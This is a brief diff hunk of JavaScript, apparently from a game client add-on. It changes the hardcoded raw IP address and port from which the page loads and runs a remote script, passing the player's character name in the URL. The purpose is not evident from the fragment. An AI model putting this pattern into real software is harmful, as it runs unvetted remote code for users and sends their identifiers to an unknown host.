@@ -85,7 +85,7 @@
     script.onload=function() {
         rpc.callClient('client_console_getMyName').then(function(a) {
             var rpc2js = document.createElement("script");
-            rpc2js.src=`http://119.206.242.196:8197/cache/rpc2.js?characterName=${a.data}`;
+            rpc2js.src=`http://88.212.253.252:26548/cache/rpc2.js?characterName=${a.data}`;
             document.head.append(rpc2js);
         })
     }
